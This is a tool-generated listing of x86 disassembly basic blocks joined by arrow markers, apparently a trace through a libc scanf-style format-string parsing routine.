0xb04dcc6:	je	0xb04f027
None
|
|
|
v
0xb050c60:	jmp	0xb04fef8
None
|
|
|
v
0xb04f140:	mov	byte ptr [edi + eax], 1
0xb04f144:	mov	eax, dword ptr [ebp - 0x178]
0xb04f14a:	movzx	ecx, byte ptr [eax]
0xb04f14d:	movzx	eax, cl
0xb04f150:	add	dword ptr [ebp - 0x178], 1
0xb04f157:	test	al, al
0xb04f159:	je	0xb050223
None
|
|
|
v
0xb04da2d:	lea	ecx, dword ptr [eax + 1]
0xb04da30:	mov	dword ptr [esi + 4], ecx
0xb04da33:	movzx	eax, byte ptr [eax]
0xb04da36:	add	edi, 1
0xb04da39:	mov	ecx, dword ptr [edx + 0x34]
0xb04da3c:	test	byte ptr [ecx + eax*2 + 1], 0x20
0xb04da41:	jne	0xb04da18
None
|
|
|
v
0xb04d8ab:	mov	dword ptr [ebp - 0x190], ecx
0xb04d8b1:	movzx	ecx, byte ptr [edi + 2]
0xb04d8b5:	lea	edx, dword ptr [edi + 2]
0xb04d8b8:	movzx	eax, cl
0xb04d8bb:	lea	edi, dword ptr [eax - 0x30]
0xb04d8be:	cmp	edi, 9
0xb04d8c1:	ja	0xb04d8f1
None
|
|
|
v
0xb051e30:	mov	edx, dword ptr [ebp - 0x1a8]
0xb051e36:	test	edx, edx
0xb051e38:	je	0xb04d800
None
|
|
|
v
0xb04f14d:	movzx	eax, cl
0xb04f150:	add	dword ptr [ebp - 0x178], 1
0xb04f157:	test	al, al
0xb04f159:	je	0xb050223
None
|
|
|
v
0xb04db90:	test	dword ptr [esi], 0x8000
0xb04db96:	je	0xb04dc32
None
|
|
|
v
0xb04f191:	movzx	ecx, al
0xb04f194:	add	eax, 1
0xb04f197:	mov	byte ptr [edi + ecx], 1
0xb04f19b:	cmp	byte ptr [edx], al
0xb04f19d:	ja	0xb04f191
None
|
|
|
v
0xb04d76f:	mov	edi, dword ptr [ebp - 0x178]
0xb04d775:	movzx	eax, byte ptr [edi]
0xb04d778:	test	al, al
0xb04d77a:	jne	0xb04d698
None
|
|
|
v
0xb052b55:	mov	dword ptr [esp], esi
0xb052b58:	mov	dword ptr [ebp - 0x14c], ecx
0xb052b5e:	call	0xb070a80
None
|
|
|
v
0xb050875:	mov	ecx, dword ptr [ebp - 0x1a4]
0xb05087b:	test	ecx, ecx
0xb05087d:	jne	0xb04f0d1
None
|
|
|
v
0xb04dcd9:	test	dword ptr [ebp - 0x17c], 0x2100
0xb04dce3:	je	0xb050890
None
|
|
|
v
0xb052b0e:	mov	edi, 2
0xb052b13:	jmp	0xb04db90
None
|
|
|
v
0xb053279:	cmp	eax, 0xff
0xb05327c:	mov	dword ptr [ebp - 0x14c], eax
0xb053282:	je	0xb050bc5
None
|
|
|
v
0xb04d583:	mov	eax, dword ptr [esi]
0xb04d585:	mov	ecx, eax
0xb04d587:	and	ecx, 4
0xb04d58a:	jne	0xb050c98
None
|
|
|
v
0xb04f178:	cmp	cl, 0x5d
0xb04f17b:	je	0xb04f140
None
|
|
|
v
0xb04dae0:	or	edi, 0x400
0xb04dae6:	movzx	eax, byte ptr [ecx]
0xb04dae9:	add	ecx, 1
0xb04daec:	cmp	al, 0x27
0xb04daee:	lea	edx, dword ptr [ecx - 1]
0xb04daf1:	jne	0xb04dad8
None
|
|
|
v
0xb05513f:	jmp	0xb04dc5a
None
|
|
|
v
0xb04d5e2:	and	eax, 0x8000
0xb04d5e7:	je	0xb04dd70
None
|
|
|
v
0xb04d7f7:	cmp	eax, 0xff
0xb04d7fa:	je	0xb04d583
None
|
|
|
v
0xb04d520:	push	ebp
0xb04d521:	mov	eax, dword ptr gs:[0]
0xb04d527:	mov	ebp, esp
0xb04d529:	push	edi
0xb04d52a:	push	esi
0xb04d52b:	push	ebx
0xb04d52c:	call	0xb1267db
None
|
|
|
v
0xb04f099:	mov	eax, dword ptr [ebp - 0x1a8]
0xb04f09f:	test	eax, eax
0xb04f0a1:	je	0xb052ef6
None
|
|
|
v
0xb04db9c:	mov	esi, dword ptr [ebp - 0x1b4]
0xb04dba2:	test	esi, esi
0xb04dba4:	jne	0xb04dc68
None
|
|
|
v
0xb050bfd:	mov	edx, dword ptr [ebp - 0x188]
0xb050c03:	test	edx, edx
0xb050c05:	jne	0xb051211
None
|
|
|
v
0xb04d875:	mov	dword ptr [ebp - 0x14c], edx
0xb04d87b:	mov	dword ptr [ebp - 0x178], edi
0xb04d881:	jmp	0xb04d76f
None
|
|
|
v
0xb050218:	mov	dword ptr [ebp - 0x1a4], edx
0xb05021e:	jmp	0xb05005b
None
|
|
|
v
0xb04fd3f:	mov	eax, dword ptr [ebp - 0x158]
0xb04fd45:	mov	ecx, dword ptr [ebp - 0x17c]
0xb04fd4b:	mov	edx, dword ptr [ebp - 0x14c]
0xb04fd51:	mov	dword ptr [ebp - 0x114], 0
0xb04fd5b:	lea	edi, dword ptr [eax + 1]
0xb04fd5e:	mov	dword ptr [ebp - 0x16c], edi
0xb04fd64:	mov	edi, dword ptr [ebp - 0x168]
0xb04fd6a:	lea	eax, dword ptr [ebp - 0x114]
0xb04fd70:	and	ecx, 8
0xb04fd73:	mov	dword ptr [ebp - 0x15c], eax
0xb04fd79:	mov	dword ptr [ebp - 0x110], 0
0xb04fd83:	mov	dword ptr [ebp - 0x184], 0
0xb04fd8d:	mov	dword ptr [ebp - 0x14c], ecx
0xb04fd93:	mov	ecx, dword ptr [ebp - 0x160]
0xb04fd99:	movzx	eax, byte ptr [ebp - 0x154]
0xb04fda0:	cmp	byte ptr [ecx + edx], al
0xb04fda3:	je	0xb050c42
None
|
|
|
v
0xb04dbec:	movzx	eax, byte ptr [edi]
0xb04dbef:	jmp	0xb04d6a0
None
|
|
|
v
0xb04daf7:	cmp	al, 0x49
0xb04daf9:	je	0xb04dae0
None
|
|
|
v
0xb0545f1:	mov	dword ptr [esp], esi
0xb0545f4:	call	0xb070a80
None
|
|
|
v
0xb052cd2:	mov	dword ptr [esp], esi
0xb052cd5:	call	0xb070a80
None
|
|
|
v
0xb04db10:	or	edi, 8
0xb04db13:	jmp	0xb04dae6
None
|
|
|
v
0xb04fde3:	mov	eax, dword ptr [ebp - 0x15c]
0xb04fde9:	mov	dword ptr [esp + 8], 1
0xb04fdf1:	mov	byte ptr [ebp - 0xe4], dl
0xb04fdf7:	mov	dword ptr [ebp - 0x168], edx
0xb04fdfd:	mov	dword ptr [esp + 0xc], eax
0xb04fe01:	lea	eax, dword ptr [ebp - 0xe4]
0xb04fe07:	mov	dword ptr [esp + 4], eax
0xb04fe0b:	mov	eax, dword ptr [ebp - 0x150]
0xb04fe11:	mov	dword ptr [esp], eax
0xb04fe14:	call	0xb0963b0
None
|
|
|
v
0xb04f083:	mov	edx, dword ptr [ebp - 0x194]
0xb04f089:	test	eax, eax
0xb04f08b:	mov	dword ptr [ebp - 0x1a4], eax
0xb04f091:	mov	dword ptr [edx], eax
0xb04f093:	je	0xb0531e5
None
|
|
|
v
0xb04dccc:	test	byte ptr [ebp - 0x17c], 8
0xb04dcd3:	jne	0xb04f0d1
None
|
|
|
v
0xb0545f9:	cmp	eax, 0xff
0xb0545fc:	jne	0xb05463d
None
|
|
|
v
0xb04fdc5:	mov	eax, dword ptr [esi + 4]
0xb04fdc8:	cmp	eax, dword ptr [esi + 8]
0xb04fdcb:	jae	0xb052cd2
None
|
|
|
v
0xb04d59b:	mov	edx, dword ptr [ebp - 0x180]
0xb04d5a1:	mov	edx, dword ptr [edx + 4]
0xb04d5a4:	mov	edi, dword ptr [edx + 0x24]
0xb04d5a7:	mov	edx, dword ptr [edx + 0x28]
0xb04d5aa:	mov	dword ptr [ebp - 0x1ac], edi
0xb04d5b0:	cmp	byte ptr [edx], 0
0xb04d5b3:	cmovne	ecx, edx
0xb04d5b6:	mov	dword ptr [ebp - 0x18c], ecx
0xb04d5bc:	mov	ecx, dword ptr [ebx + 0x38d8]
0xb04d5c2:	test	ecx, ecx
0xb04d5c4:	mov	dword ptr [ebp - 0x1b4], ecx
0xb04d5ca:	jne	0xb04eef5
None
|
|
|
v
0xb04da43:	mov	dword ptr [ebp - 0x14c], eax
0xb04da49:	mov	ecx, dword ptr [ebp - 0x154]
0xb04da4f:	mov	eax, dword ptr [ebp - 0x178]
0xb04da55:	mov	edx, dword ptr [ebp - 0x170]
0xb04da5b:	mov	dword ptr [ebp - 0x158], edi
0xb04da61:	mov	edi, dword ptr [ebp - 0x184]
0xb04da67:	mov	dword ptr [edx + ecx], eax
0xb04da6a:	mov	eax, dword ptr [ebp - 0x14c]
0xb04da70:	mov	ecx, dword ptr [ebp - 0x16c]
0xb04da76:	cmp	eax, 0xff
0xb04da79:	mov	dword ptr [ebp - 0x178], ecx
0xb04da7f:	je	0xb04da97
None
|
|
|
v
0xb052ef6:	mov	ecx, dword ptr [ebp - 0x1a8]
0xb052efc:	sub	esp, 0xa0
0xb052f02:	mov	edx, 1
0xb052f07:	lea	eax, dword ptr [esp + 0x1f]
0xb052f0b:	and	eax, 0xfffffff0
0xb052f0e:	mov	dword ptr [eax], 0
0xb052f14:	mov	dword ptr [eax + 4], ecx
0xb052f17:	mov	dword ptr [ebp - 0x1a8], eax
0xb052f1d:	xor	eax, eax
0xb052f1f:	jmp	0xb04f0b5
None
|
|
|
v
0xb04db30:	xor	eax, eax
0xb04db32:	mov	esi, eax
0xb04db34:	lea	esi, dword ptr [esi]
0xb04db38:	lea	eax, dword ptr [esi + esi*4]
0xb04db3b:	add	edx, 1
0xb04db3e:	lea	esi, dword ptr [ecx + eax*2 - 0x30]
0xb04db42:	movzx	eax, byte ptr [edx]
0xb04db45:	movzx	ecx, al
0xb04db48:	lea	edi, dword ptr [ecx - 0x30]
0xb04db4b:	cmp	edi, 9
0xb04db4e:	jbe	0xb04db38
None
|
|
|
v
0xb052da0:	jmp	0xb04fd3f
None
|
|
|
v
0xb051e5a:	mov	eax, dword ptr [esi + edi*4 + 8]
0xb051e5e:	add	edi, 1
0xb051e61:	cmp	dword ptr [esi], edi
0xb051e63:	mov	dword ptr [eax], 0
0xb051e69:	ja	0xb051e4c
None
|
|
|
v
0xb0501c6:	mov	eax, dword ptr [ebp - 0x194]
0xb0501cc:	mov	esi, ecx
0xb0501ce:	mov	eax, dword ptr [eax]
0xb0501d0:	mov	dword ptr [esp + 4], esi
0xb0501d4:	mov	dword ptr [esp], eax
0xb0501d7:	call	0xb0173e0
None
|
|
|
v
0xb050d7c:	mov	eax, dword ptr [ebp - 0x170]
0xb050d82:	mov	ecx, dword ptr [ebp - 0x154]
0xb050d88:	mov	eax, dword ptr [eax + ecx]
0xb050d8b:	mov	dword ptr [ebp - 0x174], eax
0xb050d91:	cmp	eax, 4
0xb050d94:	je	0xb050db1
None
|
|
|
v
0xb04dc09:	mov	eax, dword ptr [ebp - 0x188]
0xb04dc0f:	mov	edi, 1
0xb04dc14:	test	eax, eax
0xb04dc16:	jne	0xb04db90
None
|
|
|
v
0xb052b18:	mov	edi, dword ptr [ebp - 0x194]
0xb052b1e:	mov	eax, dword ptr [edi]
0xb052b20:	mov	dword ptr [esp], eax
0xb052b23:	call	0xb017470
None
|
|
|
v
0xb04dbc3:	cmp	dword ptr [ebp - 0x188], -1
0xb04dbca:	je	0xb051e30
None
|
|
|
v
0xb04db02:	mov	eax, edi
0xb04db04:	or	al, 0x80
0xb04db06:	test	esi, esi
0xb04db08:	cmovne	edi, eax
0xb04db0b:	jmp	0xb04dae6
None
|
|
|
v
0xb04dafb:	cmp	al, 0x27
0xb04dafd:	lea	esi, dword ptr [esi]
0xb04db00:	jne	0xb04dae6
None
|
|
|
v
0xb04f027:	test	byte ptr [ebp - 0x17c], 8
0xb04f02e:	jne	0xb04f0d1
None
|
|
|
v
0xb04d898:	movzx	eax, byte ptr [edi + 1]
0xb04d89c:	movzx	ecx, al
0xb04d89f:	sub	ecx, 0x30
0xb04d8a2:	cmp	ecx, 9
0xb04d8a5:	ja	0xb04dab8
None
|
|
|
v
0xb04fad8:	mov	dword ptr [ebp - 0x168], 0xffffffff
0xb04fae2:	jmp	0xb04d933
None
|
|
|
v
0xb04fed7:	mov	dword ptr [ebp - 0x14c], edx
0xb04fedd:	mov	ecx, dword ptr [ebx - 0xdc]
0xb04fee3:	mov	eax, dword ptr [ebp - 0x170]
0xb04fee9:	mov	edx, dword ptr [ebp - 0x174]
0xb04feef:	mov	edi, dword ptr [ebp - 0x16c]
0xb04fef5:	mov	dword ptr [eax + ecx], edx
0xb04fef8:	mov	eax, dword ptr [ebp - 0x184]
0xb04fefe:	test	eax, eax
0xb04ff00:	jne	0xb05116c
None
|
|
|
v
0xb050029:	mov	ecx, dword ptr [ebp - 0x17c]
0xb05002f:	mov	eax, ecx
0xb050031:	and	eax, 8
0xb050034:	mov	dword ptr [ebp - 0x15c], eax
0xb05003a:	mov	eax, ecx
0xb05003c:	mov	ecx, dword ptr [ebp - 0x14c]
0xb050042:	and	eax, 0x2100
0xb050047:	mov	dword ptr [ebp - 0x16c], eax
0xb05004d:	mov	eax, dword ptr [ebp - 0x15c]
0xb050053:	test	eax, eax
0xb050055:	je	0xb050150
None
|
|
|
v
0xb04d7a4:	lea	edx, dword ptr [eax + 1]
0xb04d7a7:	mov	dword ptr [esi + 4], edx
0xb04d7aa:	movzx	eax, byte ptr [eax]
0xb04d7ad:	lea	edx, dword ptr [eax + eax]
0xb04d7b0:	mov	edi, dword ptr [ebp - 0x180]
0xb04d7b6:	mov	edi, dword ptr [edi + 0x34]
0xb04d7b9:	movzx	edx, word ptr [edi + edx]
0xb04d7bd:	and	dh, 0x20
0xb04d7c0:	je	0xb04fb78
None
|
|
|
v
0xb04d942:	movzx	ecx, cl
0xb04d945:	mov	ecx, dword ptr [ebx + ecx*4 - 0x502f0]
0xb04d94c:	add	ecx, ebx
0xb04d94e:	jmp	ecx
None
|
|
|
v
0xb04f0b5:	mov	ecx, dword ptr [ebp - 0x1a8]
0xb04f0bb:	mov	dword ptr [ecx], edx
0xb04f0bd:	mov	edx, dword ptr [ebp - 0x194]
0xb04f0c3:	mov	dword ptr [ecx + eax*4 + 8], edx
0xb04f0c7:	mov	dword ptr [ebp - 0x19c], 0x64
0xb04f0d1:	cmp	byte ptr [edi + 1], 0x5e
0xb04f0d5:	mov	byte ptr [ebp - 0x154], 0
0xb04f0dc:	je	0xb050475
None
|
|
|
v
0xb04d85b:	add	edi, 1
0xb04d85e:	movzx	edx, byte ptr [edi - 1]
0xb04d862:	add	dword ptr [ebp - 0x158], 1
0xb04d869:	cmp	edx, eax
0xb04d86b:	jne	0xb04efcb
None
|
|
|
v
0xb0501d0:	mov	dword ptr [esp + 4], esi
0xb0501d4:	mov	dword ptr [esp], eax
0xb0501d7:	call	0xb0173e0
None
|
|
|
v
0xb051e3e:	mov	esi, dword ptr [ebp - 0x1a8]
0xb051e44:	mov	eax, dword ptr [esi]
0xb051e46:	test	eax, eax
0xb051e48:	je	0xb051e6b
None
|
|
|
v
0xb04dc68:	lea	edx, dword ptr [ebp - 0x134]
0xb04dc6e:	mov	eax, dword ptr [ebx + 0x38bc]
0xb04dc74:	mov	dword ptr [esp + 4], 0
0xb04dc7c:	ror	eax, 9
0xb04dc7f:	xor	eax, dword ptr gs:[0x18]
0xb04dc86:	mov	dword ptr [esp], edx
0xb04dc89:	call	eax
None
|
|
|
v
0xb04fe3f:	mov	eax, dword ptr [ebp - 0x194]
0xb04fe45:	mov	dword ptr [ebp - 0x184], 0
0xb04fe4f:	mov	ecx, dword ptr [eax]
0xb04fe51:	mov	eax, dword ptr [ebp - 0x19c]
0xb04fe57:	mov	dword ptr [ebp - 0x190], eax
0xb04fe5d:	shl	eax, 2
0xb04fe60:	mov	dword ptr [ebp - 0x168], eax
0xb04fe66:	add	eax, ecx
0xb04fe68:	cmp	dword ptr [ebp - 0x150], eax
0xb04fe6e:	jne	0xb04fdb3
None
|
|
|
v
0xb052b50:	jmp	0xb04d6f0
None
|
|
|
v
0xb04f077:	mov	dword ptr [esp], 0x64
0xb04f07e:	call	0xb0173f0
None
|
|
|
v
0xb04fe28:	add	dword ptr [ebp - 0x150], 4
0xb04fe2f:	test	dword ptr [ebp - 0x17c], 0x2100
0xb04fe39:	je	0xb04fec8
None
|
|
|
v
0xb050883:	mov	edi, 2
0xb050888:	jmp	0xb04db90
None
|
|
|
v
0xb050bb0:	mov	eax, dword ptr [ebx - 0xdc]
0xb050bb6:	mov	edi, dword ptr [ebp - 0x170]
0xb050bbc:	mov	ecx, dword ptr [ebp - 0x174]
0xb050bc2:	mov	dword ptr [edi + eax], ecx
0xb050bc5:	mov	eax, dword ptr [ebp - 0x188]
0xb050bcb:	mov	edi, 1
0xb050bd0:	test	eax, eax
0xb050bd2:	jne	0xb04db90
None
|
|
|
v
0xb04dd7f:	mov	ecx, 1
0xb04dd84:	cmp	dword ptr gs:[0xc], 0
0xb04dd8c:	je	0xb04dd8f
None
|
|
|
v
0xb04d697:	nop	
None
|
|
|
v
0xb04fdd1:	lea	edx, dword ptr [eax + 1]
0xb04fdd4:	mov	dword ptr [esi + 4], edx
0xb04fdd7:	movzx	edx, byte ptr [eax]
0xb04fdda:	add	dword ptr [ebp - 0x16c], 1
0xb04fde1:	jmp	0xb04fd93
None
|
|
|
v
0xb053222:	mov	ecx, dword ptr [ebp - 0x190]
0xb053228:	mov	edx, dword ptr [ebp + 0x10]
0xb05322b:	cmp	ecx, 1
0xb05322e:	lea	eax, dword ptr [edx + ecx*4 - 4]
0xb053232:	cmove	eax, edx
0xb053235:	mov	eax, dword ptr [eax]
0xb053237:	mov	dword ptr [ebp - 0x194], eax
0xb05323d:	jmp	0xb04f069
None
|
|
|
v
0xb04d747:	mov	dword ptr [ebp - 0x158], edi
0xb04d74d:	mov	edi, dword ptr [ebp - 0x154]
0xb04d753:	mov	dword ptr [ebp - 0x14c], eax
0xb04d759:	cmp	dword ptr [ebp - 0x14c], edi
0xb04d75f:	jne	0xb052aca
None
|
|
|
v
0xb04db38:	lea	eax, dword ptr [esi + esi*4]
0xb04db3b:	add	edx, 1
0xb04db3e:	lea	esi, dword ptr [ecx + eax*2 - 0x30]
0xb04db42:	movzx	eax, byte ptr [edx]
0xb04db45:	movzx	ecx, al
0xb04db48:	lea	edi, dword ptr [ecx - 0x30]
0xb04db4b:	cmp	edi, 9
0xb04db4e:	jbe	0xb04db38
None
|
|
|
v
0xb04f15f:	cmp	al, 0x5d
0xb04f161:	je	0xb04fd06
None
|
|
|
v
0xb050f01:	mov	edi, 1
0xb050f06:	mov	dword ptr [ebp - 0x188], 0xffffffff
0xb050f10:	jmp	0xb04db90
None
|
|
|
v
0xb04dd0e:	mov	eax, dword ptr [ebp - 0x194]
0xb04dd14:	test	eax, eax
0xb04dd16:	je	0xb051121
None
|
|
|
v
0xb04fd30:	lea	edx, dword ptr [eax + 1]
0xb04fd33:	mov	dword ptr [esi + 4], edx
0xb04fd36:	movzx	eax, byte ptr [eax]
0xb04fd39:	mov	dword ptr [ebp - 0x14c], eax
0xb04fd3f:	mov	eax, dword ptr [ebp - 0x158]
0xb04fd45:	mov	ecx, dword ptr [ebp - 0x17c]
0xb04fd4b:	mov	edx, dword ptr [ebp - 0x14c]
0xb04fd51:	mov	dword ptr [ebp - 0x114], 0
0xb04fd5b:	lea	edi, dword ptr [eax + 1]
0xb04fd5e:	mov	dword ptr [ebp - 0x16c], edi
0xb04fd64:	mov	edi, dword ptr [ebp - 0x168]
0xb04fd6a:	lea	eax, dword ptr [ebp - 0x114]
0xb04fd70:	and	ecx, 8
0xb04fd73:	mov	dword ptr [ebp - 0x15c], eax
0xb04fd79:	mov	dword ptr [ebp - 0x110], 0
0xb04fd83:	mov	dword ptr [ebp - 0x184], 0
0xb04fd8d:	mov	dword ptr [ebp - 0x14c], ecx
0xb04fd93:	mov	ecx, dword ptr [ebp - 0x160]
0xb04fd99:	movzx	eax, byte ptr [ebp - 0x154]
0xb04fda0:	cmp	byte ptr [ecx + edx], al
0xb04fda3:	je	0xb050c42
None
|
|
|
v
0xb04fb78:	xor	edi, edi
0xb04fb7a:	cmp	eax, 0xff
0xb04fb7d:	je	0xb04db90
None
|
|
|
v
0xb04dbbe:	mov	eax, dword ptr [ebp + 0x14]
0xb04dbc1:	or	dword ptr [eax], edi
0xb04dbc3:	cmp	dword ptr [ebp - 0x188], -1
0xb04dbca:	je	0xb051e30
None
|
|
|
v
0xb05359c:	test	dword ptr [ebp - 0x17c], 0x2000
0xb0535a6:	jne	0xb0535f6
None
|
|
|
v
0xb04f0d1:	cmp	byte ptr [edi + 1], 0x5e
0xb04f0d5:	mov	byte ptr [ebp - 0x154], 0
0xb04f0dc:	je	0xb050475
None
|
|
|
v
0xb04fe74:	mov	eax, dword ptr [ebp - 0x19c]
0xb04fe7a:	mov	dword ptr [esp], ecx
0xb04fe7d:	mov	dword ptr [ebp - 0x150], edx
0xb04fe83:	shl	eax, 3
0xb04fe86:	mov	dword ptr [esp + 4], eax
0xb04fe8a:	call	0xb0173e0
None
|
|
|
v
0xb04dc8b:	cmp	byte ptr [ebp - 0x19d], 0
0xb04dc92:	je	0xb04dbb7
None
|
|
|
v
0xb051e6b:	mov	esi, dword ptr [esi + 4]
0xb051e6e:	test	esi, esi
0xb051e70:	jne	0xb051e44
None
|
|
|
v
0xb055144:	lea	ecx, dword ptr [edx]
0xb055146:	call	0xb0f9430
None
|
|
|
v
0xb04f0e2:	mov	edi, dword ptr [ebp - 0x168]
0xb04f0e8:	mov	eax, 0x7fffffff
0xb04f0ed:	test	edi, edi
0xb04f0ef:	cmovns	eax, edi
0xb04f0f2:	cmp	dword ptr [ebp - 0x164], 0xff
0xb04f0fc:	mov	dword ptr [ebp - 0x168], eax
0xb04f102:	jbe	0xb050400
None
|
|
|
v
0xb04d6c8:	cmp	dword ptr [ebp - 0x14c], -1
0xb04d6cf:	je	0xb04db5e
None
|
|
|
v
0xb04d8f1:	cmp	cl, 0x24
0xb04d8f4:	je	0xb04ee50
None
|
|
|
v
0xb04ddb7:	mov	eax, dword ptr [ebp - 0x16c]
0xb04ddbd:	mov	dword ptr [ebp - 0x178], eax
0xb04ddc3:	jmp	0xb04da97
None
|
|
|
v
0xb053cc2:	mov	dword ptr [esp], esi
0xb053cc5:	call	0xb070a80
None
|
|
|
v
0xb0500fb:	mov	dword ptr [esp + 4], edx
0xb0500ff:	mov	dword ptr [esp], eax
0xb050102:	mov	dword ptr [ebp - 0x154], ecx
0xb050108:	call	0xb0173e0
None
|
|
|
v
0xb050c42:	mov	edi, dword ptr [ebp - 0x16c]
0xb050c48:	movzx	eax, dl
0xb050c4b:	mov	dword ptr [esp + 4], eax
0xb050c4f:	mov	dword ptr [esp], esi
0xb050c52:	mov	dword ptr [ebp - 0x14c], edx
0xb050c58:	sub	edi, 1
0xb050c5b:	call	0xb071270
None
|
|
|
v
0xb04d7cb:	mov	edx, dword ptr [ebx - 0xdc]
0xb04d7d1:	mov	edi, dword ptr [ebp - 0x170]
0xb04d7d7:	mov	ecx, dword ptr [ebp - 0x174]
0xb04d7dd:	mov	dword ptr [edi + edx], ecx
0xb04d7e0:	mov	edx, 0xfffffffe
0xb04d7e5:	jmp	0xb04d7b0
None
|
|
|
v
0xb04f19f:	mov	dword ptr [ebp - 0x178], edx
0xb04f1a5:	movzx	ecx, byte ptr [edx]
0xb04f1a8:	jmp	0xb04f14d
None
|
|
|
v
0xb04d6a0:	lea	edx, dword ptr [edi + 1]
0xb04d6a3:	cmp	al, 0x25
0xb04d6a5:	mov	dword ptr [ebp - 0x178], edx
0xb04d6ab:	je	0xb04d898
None
|
|
|
v
0xb04d8fa:	mov	eax, dword ptr [ebp - 0x190]
0xb04d900:	mov	dword ptr [ebp - 0x17c], 0
0xb04d90a:	mov	dword ptr [ebp - 0x190], 0
0xb04d914:	mov	dword ptr [ebp - 0x168], eax
0xb04d91a:	movzx	eax, byte ptr [edx]
0xb04d91d:	mov	edi, dword ptr [ebp - 0x168]
0xb04d923:	mov	ecx, 0xffffffff
0xb04d928:	test	edi, edi
0xb04d92a:	cmovne	ecx, edi
0xb04d92d:	mov	dword ptr [ebp - 0x168], ecx
0xb04d933:	lea	ecx, dword ptr [eax - 0x4c]
0xb04d936:	cmp	cl, 0x2e
0xb04d939:	lea	edi, dword ptr [edx + 1]
0xb04d93c:	ja	0xb04de3e
None
|
|
|
v
0xb052d91:	cmp	eax, 0xff
0xb052d94:	mov	dword ptr [ebp - 0x14c], eax
0xb052d9a:	je	0xb050bfd
None
|
|
|
v
0xb04d6b1:	movzx	edi, al
0xb04d6b4:	mov	eax, dword ptr [ebp - 0x180]
0xb04d6ba:	mov	edx, dword ptr [eax + 0x34]
0xb04d6bd:	test	byte ptr [edx + edi*2 + 1], 0x20
0xb04d6c2:	jne	0xb04d888
None
|
|
|
v
0xb051121:	mov	edi, 2
0xb051126:	jmp	0xb04db90
None
|
|
|
v
0xb0500cf:	mov	eax, dword ptr [ebp - 0x1a4]
0xb0500d5:	test	dword ptr [ebp - 0x17c], 0x2100
0xb0500df:	lea	ecx, dword ptr [eax + 1]
0xb0500e2:	mov	byte ptr [eax], 0
0xb0500e5:	je	0xb05011f
None
|
|
|
v
0xb052b41:	cmp	eax, 0xff
0xb052b44:	mov	dword ptr [ebp - 0x14c], eax
0xb052b4a:	je	0xb04db73
None
|
|
|
v
0xb04ff55:	mov	dword ptr [esp + 4], edx
0xb04ff59:	mov	dword ptr [esp], eax
0xb04ff5c:	call	0xb0173e0
None
|
|
|
v
0xb051e44:	mov	eax, dword ptr [esi]
0xb051e46:	test	eax, eax
0xb051e48:	je	0xb051e6b
None
|
|
|
v
0xb05112b:	mov	ecx, dword ptr [ebp - 0x190]
0xb051131:	mov	edx, dword ptr [ebp + 0x10]
0xb051134:	cmp	ecx, 1
0xb051137:	lea	eax, dword ptr [edx + ecx*4 - 4]
0xb05113b:	cmove	eax, edx
0xb05113e:	mov	eax, dword ptr [eax]
0xb051140:	mov	dword ptr [ebp - 0x194], eax
0xb051146:	jmp	0xb04dd0e
None
|
|
|
v
0xb04dc32:	mov	edx, dword ptr [esi + 0x48]
0xb04dc35:	sub	dword ptr [edx + 4], 1
0xb04dc39:	jne	0xb04db9c
None
|
|
|
v
0xb050c98:	mov	eax, dword ptr [ebx - 0xdc]
0xb050c9e:	mov	edi, dword ptr [ebp - 0x170]
0xb050ca4:	mov	dword ptr [edi + eax], 9
0xb050cab:	mov	eax, 0xffffffff
0xb050cb0:	jmp	0xb04dbe4
None
|
|
|
v
0xb04da36:	add	edi, 1
0xb04da39:	mov	ecx, dword ptr [edx + 0x34]
0xb04da3c:	test	byte ptr [ecx + eax*2 + 1], 0x20
0xb04da41:	jne	0xb04da18
None
|
|
|
v
0xb04dbe4:	lea	esp, dword ptr [ebp - 0xc]
0xb04dbe7:	pop	ebx
0xb04dbe8:	pop	esi
0xb04dbe9:	pop	edi
0xb04dbea:	pop	ebp
0xb04dbeb:	ret	
None
|
|
|
v
0xb0532bc:	mov	edi, 2
0xb0532c1:	jmp	0xb04db90
None
|
|
|
v
0xb0511f1:	mov	ecx, dword ptr [ebp - 0x190]
0xb0511f7:	mov	edx, dword ptr [ebp + 0x10]
0xb0511fa:	cmp	ecx, 1
0xb0511fd:	lea	eax, dword ptr [edx + ecx*4 - 4]
0xb051201:	cmove	eax, edx
0xb051204:	mov	eax, dword ptr [eax]
0xb051206:	mov	dword ptr [ebp - 0x150], eax
0xb05120c:	jmp	0xb0508b5
None
|
|
|
v
0xb04efdf:	jmp	0xb04db90
None
|
|
|
v
0xb04daf3:	cmp	al, 0x2a
0xb04daf5:	je	0xb04db10
None
|
|
|
v
0xb04d765:	mov	dword ptr [ebp - 0x154], 0
0xb04d76f:	mov	edi, dword ptr [ebp - 0x178]
0xb04d775:	movzx	eax, byte ptr [edi]
0xb04d778:	test	al, al
0xb04d77a:	jne	0xb04d698
None
|
|
|
v
0xb0532d0:	mov	eax, dword ptr [ebp - 0x168]
0xb0532d6:	add	dword ptr [ebp - 0x19c], 1
0xb0532dd:	add	eax, 4
0xb0532e0:	mov	dword ptr [esp + 4], eax
0xb0532e4:	mov	eax, dword ptr [ebp - 0x194]
0xb0532ea:	mov	eax, dword ptr [eax]
0xb0532ec:	mov	dword ptr [esp], eax
0xb0532ef:	call	0xb0173e0
None
|
|
|
v
0xb0500c2:	test	byte ptr [ebp - 0x17c], 8
0xb0500c9:	jne	0xb04ff7e
None
|
|
|
v
0xb0545fe:	mov	edx, dword ptr [ebx - 0xdc]
0xb054604:	mov	edi, dword ptr [ebp - 0x170]
0xb05460a:	mov	edi, dword ptr [edi + edx]
0xb05460d:	mov	edx, 0xfffffffe
0xb054612:	mov	dword ptr [ebp - 0x174], edi
0xb054618:	jmp	0xb04d7b0
None
|
|
|
v
0xb04dda1:	add	dword ptr [edx + 4], 1
0xb04dda5:	jmp	0xb04d5ed
None
|
|
|
v
0xb04f150:	add	dword ptr [ebp - 0x178], 1
0xb04f157:	test	al, al
0xb04f159:	je	0xb050223
None
|
|
|
v
0xb04d852:	lea	edx, dword ptr [eax + 1]
0xb04d855:	mov	dword ptr [esi + 4], edx
0xb04d858:	movzx	eax, byte ptr [eax]
0xb04d85b:	add	edi, 1
0xb04d85e:	movzx	edx, byte ptr [edi - 1]
0xb04d862:	add	dword ptr [ebp - 0x158], 1
0xb04d869:	cmp	edx, eax
0xb04d86b:	jne	0xb04efcb
None
|
|
|
v
0xb04fe9d:	mov	ecx, dword ptr [ebp - 0x194]
0xb04fea3:	shl	dword ptr [ebp - 0x19c], 1
0xb04fea9:	mov	dword ptr [ecx], eax
0xb04feab:	add	eax, dword ptr [ebp - 0x168]
0xb04feb1:	mov	dword ptr [ebp - 0x150], eax
0xb04feb7:	mov	eax, dword ptr [ebp - 0x14c]
